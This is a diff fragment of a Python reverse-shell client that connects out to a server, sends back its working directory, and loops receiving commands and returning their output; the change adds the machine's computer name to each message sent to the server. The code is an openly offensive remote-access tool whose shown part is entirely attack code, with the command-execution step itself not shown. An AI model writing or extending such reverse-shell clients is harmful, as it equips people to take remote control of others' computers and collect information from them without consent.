@@ -16,7 +16,11 @@ sock.connect((SERVER_HOST, SERVER_PORT))
 
 # get the current directory
 current_dir = os.getcwd()
-sock.send(current_dir.encode(encoding='utf-8'))
+# get the computer name
+c_name = os.environ['COMPUTERNAME']
+print(c_name)
+message = f'{current_dir}{SEPARATOR}{c_name}'
+sock.send(message.encode())
 
 while True:
     # receive the command from the server
@@ -49,9 +53,11 @@ while True:
 
     # get the current working directory as output
     current_dir = os.getcwd()
+    # get the computer name
+    c_name = os.environ['COMPUTERNAME']
 
     # send the results back to the server
-    message = f'{output}{SEPARATOR}{current_dir}'
+    message = f'{output}{SEPARATOR}{current_dir}{SEPARATOR}{c_name}'
     sock.send(message.encode())
 
 sock.close()  # close client connection
